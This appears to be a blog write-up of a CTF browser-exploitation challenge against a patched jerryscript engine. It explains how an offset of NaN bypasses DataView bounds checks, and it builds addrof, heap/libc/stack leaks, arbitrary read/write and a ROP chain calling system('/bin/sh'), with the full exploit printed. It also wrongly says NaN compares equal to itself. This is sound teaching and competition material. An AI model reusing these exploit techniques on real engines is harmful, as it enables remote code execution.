---
date: '2025-12-12T18:55:00Z'
draft: false
title: 'Mimic 2025 - Cherry'
summary: "Exploiting jerryscript in China"
categories: ["Writeups"]
tags: ["browser pwn"]
author: "leo_something & BitFriends"
ShowToc: true
---

Two weeks ago I went to Nanjing, China to take part in the [2025 Qiangwang Challenge on Cyber Mimic Defense Finals](https://ctftime.org/event/2999) with the ARESx team. Me and my buddy [@BitFriends](https://b17fr13nds.github.io) full cleared pwn during the CTF and in this writeup we are going to talk about a really nice browser challenge we encountered.

---
## Overview

The challenge consisted in a patched version of [jerryscript](https://github.com/jerryscript-project/jerryscript), a "lightweight JavaScript engine intended to run on a very constrained devices such as microcontrollers".

The patch was the following:
```diff
diff --git a/jerry-core/ecma/operations/ecma-conversion.c b/jerry-core/ecma/operations/ecma-conversion.c
index cf0c9fde..5c1b7aa2 100644
--- a/jerry-core/ecma/operations/ecma-conversion.c
+++ b/jerry-core/ecma/operations/ecma-conversion.c
@@ -905,7 +905,6 @@ ecma_op_to_integer (ecma_value_t value, /**< ecma value */
   /* 3 */
   if (ecma_number_is_nan (number))
   {
-    *number_p = ECMA_NUMBER_ZERO;
     return ECMA_VALUE_EMPTY;
   }
```

---
## Vulnerability

Looking though the source code of the original non-patched function, we can see that it follows the ECMA-262 standard (as it should), in particular the [ECMA-262 v6, 7.1.4](https://262.ecma-international.org/6.0/index.html#sec-tointeger) specification on how to implement a correct `to_integer` operation.

The entire patched function is this:
```c
ecma_value_t
ecma_op_to_integer (ecma_value_t value, /**< ecma value */
                    ecma_number_t *number_p) /**< [out] ecma number */
{
  if (ECMA_IS_VALUE_ERROR (value))
  {
    return value;
  }

  /* 1 */
  ecma_value_t to_number = ecma_op_to_number (value, number_p);

  /* 2 */
  if (ECMA_IS_VALUE_ERROR (to_number))
  {
    return to_number;
  }

  ecma_number_t number = *number_p;

  /* 3 */
  if (ecma_number_is_nan (number))
  {
	// *number_p = ECMA_NUMBER_ZERO;
    return ECMA_VALUE_EMPTY;
  }

  /* 4 */
  if (ecma_number_is_zero (number) || ecma_number_is_infinity (number))
  {
    return ECMA_VALUE_EMPTY;
  }

  ecma_number_t floor_fabs = (ecma_number_t) floor (fabs (number));
  /* 5 */
  *number_p = ecma_number_is_negative (number) ? -floor_fabs : floor_fabs;
  return ECMA_VALUE_EMPTY;
}
```
where `value` is the value to convert and `number_p` is the pointer to where the output integer should be stored. The return value is just a status that can represent success or a failure error.

To trigger the patched code we need to provide `NaN` as `value`, in this way `ecma_op_to_number` gets called and we get `*number_p = NaN`, then `number = *number_p` and we get inside the patched if statement and return.

So, long story short: this patch enables us to have `*number_p = NaN` if we call `ecma_op_to_integer` with `value` equals to `NaN`. This would not have been possible in a correctly implemented`to_integer`function! 

At this point we were kinda stuck for a bit because we needed to find a higher level function that would rely on `to_integer` not returning `NaN` and that would break if it did.
As `NaN` is a value stored in memory as `0x7ff8000000000000` we assumed that this huge number could lead to some sort of OOB somewhere, but after looking though every single call to `to_integer` we were not able to find a use for it.

At some point I was looking at this function:
```js
bool ecma_number_is_nan (ecma_number_t num) /**< ecma-number */
{
  bool is_nan = (num != num);

  return is_nan;
}
```
And I was like "WTF is this comparison?".

After a quick conversation with GPT I realized that `NaN` is a special double value that returns `False` on every comparison, except if it is compared with itself. This widened the attack surface by a lot.

Then looking again at all the functions using `to_integer` we stumbled upon the perfect one: `ecma_op_dataview_create`.
>For those of you that don't know, a dataview is an object that lets you read and write raw bytes inside of an `ArrayBuffer`.
>For dataviews you can also specify an offset and a size, if you want to target only a smaller part of the whole buffer.

That function uses `to_index` (which internally relies on `to_integer`) to convert the offset provided, then there are a bunch of **bounds checks** that make sure the dataview doesn't go OOB and finally the object gets set with all the required parameters and returned.
```c
...
/* 11 - 14. */
ecma_dataview_object_t *dataview_obj_p = (ecma_dataview_object_t *) object_p;
dataview_obj_p->header.u.cls.type = ECMA_OBJECT_CLASS_DATAVIEW;
dataview_obj_p->header.u.cls.u3.length = view_byte_length;
dataview_obj_p->buffer_p = buffer_p;
dataview_obj_p->byte_offset = (uint32_t) offset;

return ecma_make_object_value (object_p);
```

But who cares about the bounds checks, right? We can just bypass them all by setting `offset = NaN`, at that point all comparisons that involve `offset` will return `False` and we can get a dataview with an OOB of arbitrary size!

```js
const buffer = new ArrayBuffer(8);
const dataView = new DataView(buffer, NaN, 0x10000);
```
*This is a PoC that allows us to get a dataview with OOB read/write*

```
pwndbg> p dataview_obj_p->header.u.cls.u3.length
$1 = 65536
```

Nice, now exploitation time!

---
## Exploitation

### Environment setup
The provided binary was not compiled with symbols, so we had to rebuild it from source:
```bash
python tools/build.py --debug
```
**NOTE:** we had to patch the file `/CMakeLists.txt` to remove the "error-on-warning" flag. We commented out line 179 and removed the `-Werror` from line 231.

To debug the exploit you can break in the function `ecma_op_dataview_get_set_view_value`, which lets you examine memory access from the OOB dataview. For instance, a breakpoint can be set at `ecma-dataview-object.c:373`/`ecma_op_dataview_get_set_view_value+1172`, which stops the program right before access on the dataview memory via `set*()`  methods.

### Leaks
After just playing around for a bit, and checking what data can be accessed and overridden, we decided to go for leaks first. When doing simple analysis, it seemed like there is an uncompressed heap pointer right after our `DataView`:
```
0x555555664768 <jerry_global_heap+744>:	0x0000000000000000	0x00250067005b0018
0x555555664778 <jerry_global_heap+760>:	0x000000010000002c	0x00000312004a6d68
0x555555664788 <jerry_global_heap+776>:	0x00d4000e000002f3	0x7ff8000000000000
0x555555664798 <jerry_global_heap+792>:	0x0000000000000000	0x00200074005e0011
0x5555556647a8 <jerry_global_heap+808>:	0x0000000100200065	0x0000000000000000
0x5555556647b8 <jerry_global_heap+824>:	0x00000048000068c8	0x010b01aa00000323
0x5555556647c8 <jerry_global_heap+840>:	0x0064000000640032	0x000100000d00000e
0x5555556647d8 <jerry_global_heap+856>:	0x0000555555664758	0x0000000000000000
```

We can easily retrieve this value using any `get*()` methods on our vulnerable dataview. However, we had to find out the hard way that offsets were not constant. Since the exploit code lives on the heap as well, offsets will change as we are writing the exploit. This is unhandy, but just requires a step we'd have done anyway: creating `addrof` and `fakeobj` primitives.

Before that, let's quickly talk about the heap of jerryscript. It's a big memory region adjacent to the BSS where all the objects are stored, as well as the exploit code and metadata. There is no sandbox at all.

If you want to know more about jerryscript exploitation and internals take a look at ~~the official repo~~ this great writeup from another CTF:
https://github.com/pr0cf5/CTF-writeups/blob/master/2021/n1ctf-jerry/writeup.md
### Primitives
Let's start with `addrof`. for this, we'll try to create an array that is placed after our malicious dataview. We can initialize the array with numbers, to be able to scan and identify the location of the array (more on that in a minute). The actual goal would be to set individual elements of the newly created array to some object, and read it's address back via the out-of-bounds we got.

As already mentioned, indexes and offsets are problematic. That's why we needed to dynamically identify 'overlapping' offsets from our dataview, and indexes from our new array by essentially scanning the heap. Here is how we did it:
```js
const buffer = new ArrayBuffer(8);
const dataView = new DataView(buffer, NaN, 0x10000);

var a = new Array(128);

for(let i=0; i<128; i++) {
	a[i] = 0x4242;
}

var fake_idx = 0xffffffff;
var off = 0;

for(let i=0; i<0x500; i++) {
	const ptr = dataView.getUint32(i*8, true);
	if(ptr == 0x42420) {
		print("found " + ptr + " at offset " + i*8);
		
		off = i*8;
		dataView.setUint32(off, 0x43430, true);
		
		for(let j=0; j<128; j++) {
			if(a[j] == 0x4343) {
				print("found overlapping idx " + j);
				fake_idx = j;
				break
			}
		}

		if(fake_idx != 0xffffffff) {
			break
		}
	}
}
```

This initializes the array with `0x4242` at first. we then use the oob from our dataview to search for that value in memory. Be careful to search for the actual tagged values. Integers are shifted left by 4 bits, so we gotta find `0x4242 << 4 = 0x42420`. Here is how it looks in memory from the start of the dataview:
```
0x555555664788 <jerry_global_heap+776>:	0x0000000000000000	0x0025006b005f0018
0x555555664798 <jerry_global_heap+792>:	0x000000010000002c	0x0000033200576d68
0x5555556647a8 <jerry_global_heap+808>:	0x00d4000e00000313	0x7ff8000000000000
...
0x555555664838 <jerry_global_heap+952>:	0x0068000000680032	0x000100000000000e
0x555555664848 <jerry_global_heap+968>:	0x0000555555664778	0xc003000f00000000
0x555555664858 <jerry_global_heap+984>:	0x0000008000646dc8	0x005401aa0000036b
...
0x555555664958 <jerry_global_heap+1240>: 0xd042a8350000001b	0x6f20646e756f6615
0x555555664968 <jerry_global_heap+1256>: 0x697070616c726576	0x262078646920676e
0x555555664978 <jerry_global_heap+1272>: 0x0004242000043430	0x0004242000042420
0x555555664988 <jerry_global_heap+1288>: 0x0004242000042420	0x0004242000042420
0x555555664998 <jerry_global_heap+1304>: 0x0004242000042420	0x0004242000042420
0x5555556649a8 <jerry_global_heap+1320>: 0x0004242000042420	0x0004242000042420
```

If we find this, we got the offset. now we use our oob to change the value in order to also identify the corresponding index. This results in getting an overlapping access by using offset and index. The `addrof` primitive can now be build like this:
```js
function addrof(obj) {
	a[fake_idx] = obj;
	var tagged = dataView.getUint32(off, true);
	a[fake_idx] = 0x4242;
	return (tagged & (~3))
}
```
In jerryscript, object pointers are compressed and tagged. We just gotta clear the last two bits.

Great! We can now get the addresses of objects and calculate offsets between them. This comes in handy for our initial problem: getting a heap leak. We can use `addrof` to calculate the offset beween the dataview and the underlying buffer to get the correct offset and leak:
```js
var offset = addrof(dataView) - addrof(buffer)
var ptr = dataView.getBigInt64(offset, true) - 0x72588n;
var got = ptr + 0x70dc0n;

print("pie base: " + ptr)
```

### Arbitrary r/w
Well, now you'd typically craft a `fakeobj` primitive. Problem is that we are absolutely clueless about the full internal structure of objects in the jerryscript engine. We tried analyzing `ArrayBuffers`, and the only thing we could notice is the uncompressed pointer to it's data, similar to `BackingStore` in v8. We will not include our failed attempts on creating a `fakeobj` primitive. We decided to stop messing with the stupid assertion errors and did something else.

We can just allocate an `ArrayBuffer`, find the offset with our `addrof` primitive and then use thee OOB to change the data pointer to a location we desire:
```js
var target = new ArrayBuffer(0x10000);
var target_view = new Uint32Array(target);

target_view[0] = 0x41414141
target_view[1] = 0x42424242
target_view[2] = 0x43434343
target_view[3] = 0x44444444

var offset2 = addrof(target) - addrof(buffer)
var ptr2 = dataView.getBigInt64(offset2, true);

print("backing store: " + ptr2)

dataView.setBigInt64(offset2, got, true);
ptr2 = dataView.getBigInt64(offset2, true);
print("backing store modified: " + ptr2)
```
After quickly confirming the offset of the data pointer inside the `ArrayBuffer` object, we see the correct backing store being leaked and modified. Accessing the `ArrayBuffer` confirms our arbitrary read/write! From now on it's an easy game. 
We leaked libc from the GOT of jerryscript, the stack from `environ`, and wrote a ROP chain on the stack and GG!
### Final exploit
```js
const buffer = new ArrayBuffer(8);
const dataView = new DataView(buffer, NaN, 0x10000);

var a = new Array(128);

for(let i=0; i<128; i++) {
	a[i] = 0x4242;
}

var fake_idx = 0xffffffff;
var off = 0;

for(let i=0; i<0x500; i++) {
	const ptr = dataView.getUint32(i*8, true);
	if(ptr == 0x42420) {
		print("found " + ptr + " at offset " + i*8);
		
		off = i*8;
		dataView.setUint32(off, 0x43430, true);
		
		for(let j=0; j<128; j++) {
			if(a[j] == 0x4343) {
				print("found overlapping idx " + j);
				fake_idx = j;
				break
			}
		}

		if(fake_idx != 0xffffffff) {
			break
		}
	}
}

function addrof(obj) {
	a[fake_idx] = obj;
	var tagged = dataView.getUint32(off, true);
	a[fake_idx] = 0x4242;
	return (tagged & (~3))
}  

// exploit goes here...

var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = float
	f64_buf[0] = val;
	return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
	u64_buf[0] = Number(val & 0xffffffffn);
	u64_buf[1] = Number(val >> 32n);
	return f64_buf[0];
}

var offset = addrof(dataView) - addrof(buffer)
var ptr = dataView.getBigInt64(offset, true) - 0x72588n;
var got = ptr + 0x70dc0n;

print("pie base: " + ptr)

var target = new ArrayBuffer(0x10000);
var target_view = new Uint32Array(target);

target_view[0] = 0x41414141
target_view[1] = 0x42424242
target_view[2] = 0x43434343
target_view[3] = 0x44444444

var offset2 = addrof(target) - addrof(buffer)
var ptr2 = dataView.getBigInt64(offset2, true);

print("backing store: " + ptr2)

dataView.setBigInt64(offset2, got, true);
ptr2 = dataView.getBigInt64(offset2, true);
print("backing store modified: " + ptr2)
  
var libc = (BigInt(target_view[1]) << 32n) + BigInt(target_view[0]) - 0x224a00n + 0xed700n;

print("libc base: " + libc)

var environ = libc + 0x34a2d0n - 0x13f578n;
var pop_rdi = libc + 0x10f78bn;
var ret = pop_rdi + 0x1n;
var system = libc + 0x58750n;
var binsh = libc + 0x1cb42fn;

dataView.setBigInt64(offset2, environ, true);

ptr2 = dataView.getBigInt64(offset2, true);

print("backing store modified: " + ptr2)

var stack = (BigInt(target_view[1]) << 32n) + BigInt(target_view[0]) + 0x138n - 0x270n - 0x8n;

print("stack: " + stack)
  
dataView.setBigInt64(offset2, stack, true);
ptr3 = dataView.getBigInt64(offset2, true);
print("backing store modified: " + ptr3)

  
target_view[2] = Number(ret & 0xffffffffn)
target_view[3] = Number(ret >> 32n)
target_view[4] = Number(pop_rdi & 0xffffffffn)
target_view[5] = Number(pop_rdi >> 32n)
target_view[6] = Number(binsh & 0xffffffffn)
target_view[7] = Number(binsh >> 32n)
target_view[8] = Number(system & 0xffffffffn)
target_view[9] = Number(system >> 32n)
```
